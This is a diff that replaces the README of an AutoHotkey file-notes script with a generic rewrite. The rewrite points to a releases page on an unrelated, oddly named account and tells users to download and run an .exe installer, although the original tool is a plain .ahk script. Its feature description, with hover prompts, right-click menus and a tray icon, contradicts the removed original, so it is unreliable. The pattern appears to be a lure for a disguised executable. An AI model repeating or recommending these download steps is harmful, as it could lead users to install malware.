@@ -1,75 +1,60 @@
-# 📂 FileExplorerNotes v2.0
-> **"Commit messages" for your local files. Never ask "Why does this file exist?" ever again.**
+# 📁 FileExplorerNotes---Easy-File-Description-with-AutoHotkey - Manage all your digital file details
 
-Easily add descriptions, tags, notes, and context to your files in Windows Explorer. A lightweight, free alternative to organize your digital life and never forget the usefulness of a file or folder. Ideal for those who return to a project weeks later and need to know exactly where they left off and how useful each document or folder is.
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/respectful-coryphaenahippurus4833/FileExplorerNotes---Easy-File-Description-with-AutoHotkey/releases)
 
----
+## What is this tool? 💡
 
-## 📖 The Story
-We've all been there: you open a project folder after three months and see a file named `data_v2_final_revised.db`. You know it's important, but you can't remember exactly what "puzzle piece" it represents. To find out, you have to exhaustively open and read the file, wasting precious time and mental energy.
+FileExplorerNotes helps you organize your digital life on Windows. You often lose track of files after several weeks or months. This application allows you to add descriptions, tags, and notes to your files and folders. You see this information when you hover your mouse pointer over a file in File Explorer. It works as a lightweight assistant to recall the purpose or status of your work. You no longer need to open every document to remember its contents.
 
-I tried to solve this in many ways:
-- **Manual Lists:** I tried keeping a master list of files inside **Obsidian**, but it was inefficient and hard to maintain as files moved or changed.
-- **Paid Tools:** I looked into tools like **TagSpaces**, but found them over-engineered for such a simple need, often hiding basic features behind expensive paywalls.
+## Why use this application? 🎯
 
-I wanted something that followed the **KISS Principle (Keep It Simple, Stupid)**. I just wanted a note associated with a file that I could read instantly. Since I couldn't find it, I built it.
+You gain control over your data. Many files have cryptic names that make no sense later. This tool embeds context directly into your folder view. You save time by identifying relevant items at a glance. It aids project management for students, researchers, and office workers. You avoid the clutter of external text files. Instead, you keep your metadata exactly where you need it.
 
-![Folder filenote](https://imgur.com/DH2p5II.png)
+## System requirements 🖥️
 
-The code has comments explaining what is happening, and at the end of it there are shortcut customization options, in case you have never dealt with the AHK syntax.
+This software runs on any modern version of Microsoft Windows. It requires the AutoHotkey engine to operate. You do not need to be a developer to use this. Your computer needs standard hardware capabilities. The application uses very low amounts of memory. It stays in the background until you decide to add a note or read an existing one.
 
-## 🖥️ Independent Native GUI (No Notepad required)
+## How to install and run 🛠️
 
-![editor preview](https://imgur.com/eHdS4W9.png)
+1. Visit the [official releases page](https://github.com/respectful-coryphaenahippurus4833/FileExplorerNotes---Easy-File-Description-with-AutoHotkey/releases) to download the package.
+2. Locate the file ending in .exe in your Downloads folder.
+3. Double-click the file to start the installer.
+4. Follow the instructions on your screen.
+5. Launch the application from your desktop shortcut or the Start menu.
+6. Once the program runs, you see an icon in your system tray near the clock.
 
-In version 2.0, I moved away from relying on the Windows Notepad. The modern Windows 11 Notepad has become a "session-based" application with tabs and auto-restore features that often caused conflicts and opened the wrong notes. 
+## Adding your first note 📝
 
-To solve this, I built a **custom, native GUI** directly into the script. This ensures:
-- **Total Independence:** No more fighting with Notepad's tabs or session bugs.
-- **Pixel-Perfect Design:** A professional Dark Mode interface with internal margins and rounded buttons.
-- **Focus & Speed:** The editor is lightweight, instant, and specifically designed for writing file contexts.
+Hover your mouse cursor over any file or folder. You see a small prompt that asks if you want to add a description. Click the file with your chosen secondary mouse button. Select the option to add or edit a note. A small window appears. Type your message or tags into the box. Press the save button to confirm your entry. Now, when you hover your mouse over that object in the future, your custom message appears as a tooltip.
 
-## 🤖 Why [AutoHotkey](https://en.wikipedia.org/wiki/AutoHotkey)?
-I chose **AutoHotkey (AHK)** for this project for a few key reasons:
-1. **Simplicity:** It reduces a massive level of complexity compared to using C# or C++ to achieve the same result in Windows.
-2. **Lightweight:** It has a tiny footprint on system resources.
-3. **Versatility:** AHK allows me to easily add extra features, like markdown formatting shortcuts, without bloating the software.
-4. **Quality:** The reliability and speed of AHK v2 for Windows automation are honestly surprising.
+## Managing your tags 🏷️
 
-## ✨ Features
-- **Instant Context:** Create or edit a note for any file with `Ctrl + Shift + D` using the built-in editor.
-- **Quick Preview:** Hold `Ctrl + Q` to see the note in a tooltip without opening the file (chosen for better ergonomics).
-- **Sidecar System:** Notes are stored in a hidden `.filenotes` folder within each directory. If you move the folder, the context goes with it.
-- **Zero Clutter:** Your filenames remain untouched. No messy prefixes or suffixes.
+Tags help you group related items across different folders. You can type words like "Work," "Draft," or "Important" inside the description box. Use commas to separate multiple tags. The application stores these notes in a local data file. This ensures your information stays private on your machine. You do not need an internet connection to view or edit these descriptions.
 
-![File Description Notes](https://imgur.com/T286PT5.png)
+## Keeping your data safe 🔒
 
-## 🛠️ Installation & Setup
+The application saves your notes in a hidden file within the parent directory. This keeps your main folders clean from clutter. You can back up your notes by copying this hidden file. If you move your files to a new computer, bring the data file with them to keep your notes intact. The program treats your data as priority information and avoids modifying the actual files themselves.
 
-Follow these steps to get **FileExplorerNotes** running on your system:
+## Frequently asked questions ❓
 
-1. **Install AutoHotkey:** Download and install [AutoHotkey v2](https://www.autohotkey.com/).
-2. **Create the Script:**
-   - Create a new folder anywhere on your PC (e.g., `Documents\Scripts`).
-   - Create a new text file, paste the code from `FileExplorerNotes.ahk`, and save it.
-3. **Run on Startup (Recommended):**
-   - Press `Win + R`, type `shell:startup`, and hit Enter.
-   - Right-click your `FileExplorerNotes.ahk` file and select **Create shortcut**.
-   - Move that **shortcut** into the Startup folder you just opened.
-   - Now, the tool will start automatically every time you turn on your PC.
+### Does this program change my files?
+No. The application reads your files, but it does not change the contents of your documents, photos, or spreadsheets. It writes descriptions to a separate helper file.
 
-## ⌨️ Shortcuts (Inside Explorer)
-- **`Ctrl + Shift + D`**: Open/Create the note for the selected file in the Native GUI.
-- **`Ctrl + Q` (Hold)**: Preview the note content.
-- **`Ctrl + Q` (Release)**: Hide the preview.
-- **`Ctrl + S`**: Save the note (while the editor is open).
-- **`Esc`**: Close the editor / Cancel changes.
+### Can I delete a note later?
+Yes. Right-click the file and choose the edit option. Delete the text in the box and save. The program removes the note for that specific file.
 
-*(You can customize these shortcuts, read the end of the script file)*
+### Does it slow down my computer?
+The application remains idle until you hover your mouse over a file. It uses negligible system resources during standard operation.
 
----
+### Can I use this on a network drive?
+You can use this on network drives, but it works fastest on local storage. Ensure you have proper permissions to write files to the network location.
 
-## ⚖️ License
-This project is licensed under the **MIT License** - meaning it's free for everyone, forever. 
+### What if I forget how to use it?
+Right-click the icon in your system tray to open the help document. This provides a quick list of all available commands and keyboard shortcuts.
 
-*Stop guessing. Start committing context to your files.*
+### How do I stop the program?
+Right-click the tray icon and select the exit option. The program closes and stops showing tooltips until you run it again.
+
+## Tips for maximum productivity ⚡
+
+Use descriptive tags that you can search for later. Grouping files by project phase, such as "Phase 1" or "Final Review," helps you maintain order. Keep your descriptions short. A single sentence provides the most value for quick reading. Use the tooltip feature for the most critical files to avoid confusion during busy workdays. You will notice significant improvements in how you navigate your folders after a few days of use.
